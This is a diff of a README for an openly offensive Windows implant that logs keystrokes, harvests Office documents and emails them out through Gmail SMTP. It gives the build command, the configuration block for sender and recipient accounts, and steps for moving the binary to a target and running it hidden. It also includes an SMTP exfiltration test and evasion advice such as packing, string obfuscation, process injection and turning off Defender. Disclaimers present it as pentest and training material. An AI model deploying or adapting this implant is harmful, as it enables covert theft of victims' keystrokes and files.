@@ -1,141 +1,259 @@
-Windows Keylogger & Document Exfiltrator
-A proof-of-concept Windows implant that logs keystrokes, collects Office documents, and exfiltrates them via Gmail SMTP. Built for authorized penetration testing and red team engagements.
+# Windows Keylogger & Document Exfiltrator
 
-⚠️ Legal Notice
-This tool is intended only for authorized security assessments on systems you own or have explicit written permission to test. Unauthorized use is illegal. The author assumes no liability for misuse.
+A proof-of-concept Windows implant that logs keystrokes, collects Office documents, and exfiltrates them via Gmail SMTP. Built for authorized penetration testing, red team engagements, and cybersecurity education.
 
-Features
-Keystroke Logging — Captures virtual key codes via a low-level keyboard hook (WH_KEYBOARD_LL)
-Document Collection — Scans Documents and Desktop folders for .docx and .xlsx files
-Deduplication — Tracks already-sent files via doc_sent.log to avoid re-sending
-ZIP Compression — Packages collected documents into a ZIP archive using PowerShell's System.IO.Compression
-Email Exfiltration — Sends keylog + document archive as attachments via Gmail SMTP (TLS on port 587)
-Debug Logging — Writes a timestamped debug log to trace execution flow
-Persistence-Ready — Runs hidden (-mwindows), suitable for scheduled task or startup folder deployment
-Architecture
+---
 
+## ⚠️ Legal Notice
 
+This tool is intended **only** for authorized security assessments on systems you own or have explicit written permission to test.
 
+Unauthorized use is illegal. The author assumes **no liability** for misuse.
+
+---
+
+# ✨ Features
+
+* **Keystroke Logging** — Captures virtual key codes using a low-level keyboard hook (`WH_KEYBOARD_LL`)
+* **Document Collection** — Scans **Documents** and **Desktop** folders for `.docx` and `.xlsx` files
+* **Deduplication** — Tracks previously collected files using `doc_sent.log`
+* **ZIP Compression** — Compresses collected files using PowerShell's `System.IO.Compression`
+* **Email Exfiltration** — Sends the keylog and ZIP archive via Gmail SMTP (TLS/587)
+* **Debug Logging** — Generates timestamped debug logs
+* **Persistence Ready** — Designed to run hidden (`-mwindows`) and compatible with Scheduled Tasks or Startup Folder persistence
+
+---
+
+# 🏗️ Architecture
+
+```text
 collector.exe
-├── KeyloggerThread        ← Low-level keyboard hook, writes to kl.dat
-├── Main Loop (60s cycle)  ← Collect docs → ZIP → Email via PowerShell
-└── Debug Log              ← Writes to collector_debug.log
-File Paths (on victim)
+├── KeyloggerThread
+│      └── Low-level keyboard hook → writes to kl.dat
+│
+├── Main Loop (60-second cycle)
+│      ├── Collect Office documents
+│      ├── Compress into ZIP
+│      └── Send email via PowerShell
+│
+└── Debug Logger
+       └── Writes execution status to collector_debug.log
+```
 
+---
 
-File	Purpose
-C:\Windows\Temp\kl.dat	Keystroke log
-C:\Windows\Temp\kl_attachment.dat	Temp copy for email attachment
-C:\Windows\Temp\collected\	Staging directory for found documents
-C:\Windows\Temp\data.zip	Compressed document archive
-C:\Windows\Temp\doc_sent.log	Tracks already-exfiltrated files
-C:\Windows\Temp\send_mail.ps1	Auto-generated PowerShell email script
-C:\Windows\Temp\collector_debug.log	Debug log for troubleshooting
-Requirements
-Compiler: MinGW-w64 (GCC)
-Target Windows: 7/10/11 (x64)
-Gmail Account: With App Password enabled (app password, not regular password`
-Defender: Windows Defender may flag the binary — add exclusions or disable real-time monitoring during testing
-Compilation
-powershell
+# 📂 File Structure
 
+| File                                  | Purpose                               |
+| ------------------------------------- | ------------------------------------- |
+| `C:\Windows\Temp\kl.dat`              | Keystroke log                         |
+| `C:\Windows\Temp\kl_attachment.dat`   | Temporary attachment copy             |
+| `C:\Windows\Temp\collected\`          | Staging directory                     |
+| `C:\Windows\Temp\data.zip`            | ZIP archive                           |
+| `C:\Windows\Temp\doc_sent.log`        | Tracks already-sent documents         |
+| `C:\Windows\Temp\send_mail.ps1`       | Auto-generated PowerShell SMTP script |
+| `C:\Windows\Temp\collector_debug.log` | Debug log                             |
 
+---
 
+# 📋 Requirements
+
+* **Compiler:** MinGW-w64 (GCC)
+* **Operating System:** Windows 7 / 10 / 11 (x64)
+* **SMTP:** Gmail account with **App Password**
+* **Windows Defender:** May detect the executable. Consider adding exclusions or disabling real-time protection in an isolated lab environment.
+
+---
+
+# ⚙️ Compilation
+
+```powershell
 gcc -o collector.exe collector.c -luser32 -lgdi32 -lshell32 -ladvapi32 -O2 -s -mwindows
+```
 
+### Compiler Flags
 
-Flag	Purpose
--luser32 -lgdi32 -lshell32 -ladvapi32	Link required Windows API libraries
--O2	Optimize for size/speed
--s	Strip debug symbols
--mwindows	Run without a console window (GUI subsystem)
-Configuration
-Edit the #define block at the top of collector.c:
+| Flag         | Description                    |
+| ------------ | ------------------------------ |
+| `-luser32`   | User32 Windows API             |
+| `-lgdi32`    | Graphics Device Interface      |
+| `-lshell32`  | Shell API                      |
+| `-ladvapi32` | Advanced Windows API           |
+| `-O2`        | Optimize for speed/size        |
+| `-s`         | Strip debug symbols            |
+| `-mwindows`  | Build without a console window |
 
-c
+---
 
+# ⚙️ Configuration
 
+Edit the configuration section in `collector.c`:
 
+```c
 #define SMTP_SERVER     "smtp.gmail.com"
 #define SMTP_PORT       587
+
 #define EMAIL_FROM      "youraccount@gmail.com"
 #define EMAIL_TO        "target@gmail.com"
+
 #define EMAIL_SUBJECT   "Pentest Data Collection"
+
 #define EMAIL_USER      "youraccount@gmail.com"
-#define EMAIL_PASS      "xxxx xxxx xxxx xxxx"   // Gmail App Password
-Usage
-Compile the binary
-Transfer to the target (AnyDesk, USB, SMB share, etc.)
-Run:
-powershell
+#define EMAIL_PASS      "xxxx xxxx xxxx xxxx"
+```
 
+---
 
+# 🚀 Usage
 
-# Deploy
+## 1. Compile
+
+Compile the source code using MinGW.
+
+## 2. Transfer
+
+Transfer the executable to the target system.
+
+Examples:
+
+* AnyDesk
+* USB
+* SMB Share
+
+## 3. Deploy
+
+```powershell
 copy collector.exe C:\ProgramData\
+```
 
-# Execute
+## 4. Execute
+
+```powershell
 C:\ProgramData\collector.exe
+```
 
-# Verify it's running
+## 5. Verify Process
+
+```powershell
 Get-Process -Name collector
+```
 
-# Check debug log after ~2 minutes
+## 6. Check Debug Log
+
+```powershell
 Get-Content "C:\Windows\Temp\collector_debug.log"
-The implant runs on a 60-second loop:
+```
 
-Collects new .docx/.xlsx files from %USERPROFILE%\Documents, Desktop, and C:\Users\Public\Documents
-Compresses them into data.zip
-Attaches both keylog.txt and data.zip to an email
-Sends via Gmail SMTP
-Clears the keylog for the next cycle
-Evasion Notes
-Antivirus: MinGW-compiled binaries are commonly detected. Consider:
-Obfuscation / packing (UPX, etc.)
-Custom encryption of strings at rest
-Process injection techniques
-Firewall: Outbound SMTP on port 587 must be allowed — or use a different exfil channel
-App Passwords: Gmail app passwords are 16 characters with spaces. If the password contains special characters, escape them properly in the C string
-Debugging
-If emails don't arrive, check:
+---
 
-Process is running:
-powershell
+# 🔄 Runtime Workflow
 
+Every **60 seconds**, the application performs the following:
 
+1. Search for new `.docx` and `.xlsx` files.
+2. Copy newly discovered files.
+3. Compress them into `data.zip`.
+4. Attach:
 
+   * `keylog.txt`
+   * `data.zip`
+5. Send via Gmail SMTP.
+6. Clear the keylog.
+7. Repeat.
+
+---
+
+# 🥷 Evasion Notes
+
+### Antivirus
+
+MinGW binaries are commonly detected.
+
+Possible research topics include:
+
+* UPX packing
+* String obfuscation
+* Custom encryption
+* Process injection
+
+### Firewall
+
+Outbound SMTP (TCP/587) must be permitted.
+
+### Gmail
+
+Requires a Gmail **App Password** (16-character password).
+
+---
+
+# 🐞 Debugging
+
+## Check Process
+
+```powershell
 Get-Process -Name collector
-Debug log contents:
-powershell
+```
 
+## View Debug Log
 
-
+```powershell
 Get-Content "C:\Windows\Temp\collector_debug.log"
-Keylog file exists:
-powershell
+```
 
+## Verify Keylog
 
-
+```powershell
 Get-Item "C:\Windows\Temp\kl.dat"
-PowerShell script was created:
-powershell
+```
 
+## Verify PowerShell Script
 
-
+```powershell
 Test-Path "C:\Windows\Temp\send_mail.ps1"
-Test SMTP directly:
-powershell
+```
 
+## Test SMTP
 
-
+```powershell
 $smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
 $smtp.EnableSsl = $true
-$smtp.Credentials = New-Object System.Net.NetworkCredential('youraccount@gmail.com', 'app-password')
-$smtp.Send('youraccount@gmail.com', 'target@gmail.com', 'Test', 'SMTP direct test')
-Limitations
-Keylog Format: Captures virtual key codes (VK), not character output. Useful for detecting activity and patterns, not for direct text reconstruction
-Gmail Dependency: Requires a working Gmail account with app password access
-No Persistence: Must be deployed manually or via a separate persistence mechanism (scheduled task, startup folder, etc.)
-Single Binary: No C2, no encryption, no process injection — bare-minimum implant
-License
-For authorized security testing and educational purposes only.`
+$smtp.Credentials = New-Object System.Net.NetworkCredential('youraccount@gmail.com','app-password')
+$smtp.Send('youraccount@gmail.com','target@gmail.com','Test','SMTP direct test')
+```
+
+---
+
+# ⚠️ Limitations
+
+* Captures **Virtual Key Codes (VK)** instead of reconstructed characters.
+* Depends on Gmail SMTP.
+* Does **not** implement persistence by default.
+* Single executable.
+* No C2 framework.
+* No encryption.
+* No process injection.
+
+---
+
+# 📚 Educational Context
+
+This project was developed as part of a **Windows API Programming** module in a cybersecurity training program.
+
+The objective is to understand:
+
+* Windows API programming
+* Keyboard hooks
+* File collection
+* PowerShell automation
+* SMTP communication
+* Malware behavior
+* Detection engineering
+* Incident response
+
+---
+
+# 📄 License
+
+This project is provided **for educational purposes, authorized penetration testing, and cybersecurity research only**.
+
+Use only on systems you own or have explicit written authorization to assess.
